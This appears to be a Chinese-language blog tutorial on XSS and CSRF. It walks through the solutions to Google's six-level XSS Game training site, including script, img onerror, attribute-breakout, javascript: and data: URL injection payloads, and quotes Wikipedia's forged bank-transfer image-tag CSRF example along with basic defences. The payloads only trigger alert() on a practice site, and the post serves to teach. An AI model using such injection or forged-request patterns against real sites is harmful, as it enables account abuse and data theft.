---
title: Web安全系列：XSS和CSRF
mathjax: false
copyright: true
comment: true
date: 2019-11-18 16:33:05
tags:
- Security
categories:
- Security

---

{% note primary %}
XSS、CSRF
{% endnote %}

<!-- more -->

---


## 前言

Web应用的安全问题也是一个web开发人员需要了解的事，今天我们就来看一看常见的两种安全问题，`XSS`和`CSRF`。

**因为对安全问题不够熟悉，读者如果发现问题请右下角小窗私聊或文章右上角修改按钮github提交pr。**

大体内容如下：

- XSS
  - 什么是XSS
  - XSS分类
  - XSS实例
  - XSS避免
- CSRF
  - 什么是CSRF
  - CSRF实例
  - CSRF避免

## XSS
> Cross-site scripting (XSS) bugs are one of the most common and dangerous types of vulnerabilities in Web applications.These nasty buggers can allow your enemies to steal or modify user data in your apps.


通过这个[小实验（游戏）](https://xss-game.appspot.com/)，你就可以大致了解一下XSS是一个什么东西了。

认识的一个大佬也写过一篇[XSS文章](https://orzbox.github.io/our-tech/#/articles/XSS-Explain-1)，可以当做参考。

做了一下这个实验，勉勉强强算是通关了。

在这个XSS Game中做了什么？**整体感觉就是从客户端找漏洞（看网页源码，JS、HTML），然后通过表单或者url注入脚本或者一些其他第三方脚本。**

> Cross-site scripting carried out on websites accounted for roughly 84% of all security vulnerabilities documented by Symantec up until 2007.（Wikipedia）



### 常见XSS分类

- Stored XSS Attacks：持久注入，注入数据库
- Reflected XSS Attacks:注入的数据会由服务器返回或者直接跳转到另一个页面显示
- DOM-based XSS Attacks：修改DOM

### XSS注入方式

- 表单注入
- URL注入
- 引用外部脚本

### XSS避免

- 同源策略
- 白名单策略（内容安全策略，Content Safe Policy）
- 表单验证
- 拼凑字符串时验证来自querystring的变量

### XSS Game实验内容

大体记录一下实验内容吧。

#### level1

一个提交表单的页面，输入数据data并提交。
观察py代码可以看到他会将data渲染到页面内，那么我可以输入以下内容：

```html
<script>alert(1)</script>
```

OK，Hello World to XSS就完成了。


#### level2

一个发送评论的页面。
通过观察源码，发现他也会将输入的数据data直接显示出来。

但是这时候使用level1中的方法已经不管用了（可能是因为页面已经加载完了，无法执行script脚本

但是我可以通过如下代码来实现，插入一个无效图片，通过onerror方法来执行脚本。


```html
<img src="" onerror="alert(1)"/>
```

level2 is over！

#### level3

没有可输入的表单，但是可以通过URL输入，有个哈希参数用于图片显示。

通过观察源码，发现他将url输入的数字编号通过img标签进行拼接了（num就是我们输入的数）。

```html
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```

那我们可以通过如下代码来封闭标签：

```html

https://xss-game.appspot.com/level3/frame#x' onerror='alert("xss")'>

```

完成！

#### level4

一个输入表单数据timer，然后提交。

通过查看py代码，发现他的数据渲染部分：

```text
  <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />

```

我们利用封闭标签，输入如下代码：

```text
');alert('xss

模板渲染后：onload="startTimer('');alert('xss');"
```
这样就完成了。


#### level5

观察源码有一个a标签是通过模板渲染的:

```html
<a href="{{ next }}">Next >></a>
```

这里使用a标签的伪协议来完成，我们可以输入：

```html
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)

模板渲染后：<a href="javascript:alert(1)">Next >></a>
```

#### level6

可以通过URL请求其他文件，可以通过data协议（`data:text/plain,alert('s')`）创建一个简单的文本。



结果：

``` html
https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')
```

## CSRF

> 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。（Wikipedia）

顾名思义，就是攻击者伪造请求。假如说用户在A网站登录了，这时候浏览器保存了登录信息，这段时间内用户又访问了B网站，B网站内存在一个A网站则请求（这个请求是攻击者伪造的），这样就属于跨站请求伪造。

### 维基百科上的例子

前提是没有同源策略，Attackers才能使用银行的登录信息。

```html
假如一家银行用以运行转账操作的URL地址如下： http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName

那么，一个恶意攻击者可以在另一个网站上放置如下代码： <img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">

如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。

这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。

透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义运行操作。
```

因为同源策略不允许读取其他源的cookie，所以如何完成攻击呢？
如果可以，使用XSS攻击加CSRF攻击就可以很好的完成。首先使用stored的XSS注入到数据库，然后显示到银行的网页，此时victim不小心点击的这个标签，就会发起请求了。

### 预防

- 检查Referer字段，发起请求的来源。存在客户端伪造Referer的可能
- 添加校验token（伪随机数）

## Reference

- [Warning: You are entering the XSS game area](https://xss-game.appspot.com/)
- [XSS跨站脚本攻击探讨总结](https://orzbox.github.io/our-tech/#/articles/XSS-Explain-1)
- [Cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)
- [跨站请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
